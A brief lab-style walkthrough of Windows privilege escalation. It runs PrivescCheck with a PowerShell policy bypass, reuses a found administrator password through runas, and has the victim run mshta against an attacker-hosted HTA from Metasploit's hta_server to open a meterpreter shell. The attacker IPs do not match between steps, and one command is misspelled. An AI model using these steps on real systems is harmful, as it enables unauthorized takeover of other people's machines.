After breaking into a windows system, we can use privescCheck to escalate our privilege.
First, Open the powershell.exe terminal to check the current user.
-whoami
Switch current folder to PrivescCheck folder.

Running PrivescCheck.ps1 script.
-powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"

We have found an administrator user credential. i.e administrator:hello_123321.

NEXT, We are running a command prompt i.e cmd.exe as an administrator user using discovered credential and runas.exe.

-runas.exe /user:administrator cmd
-hello_123321<this is the password>
-whoami

After confirming the credentials are legit, we will now run the hta_server module to gain the meterpreter shell. Start msfconsole.
-use exploit/windows/misc/hta_server
-exploit
“This module hosts an HTML Application (HTA) that when opened will run a payload via Powershell.”

Copy the generated payload i.e “http://10.10.31.2:8080/Rv4eiCTge85UJ15.hta” and run it on cmd.exe with mshta command to gain the meterpreter shell.

Note: You need to execute the below payload on the cmd.exe.

Switch to Victim Machine

-mstha.exe http://10.10.41.3:8080/Te1yri.hta
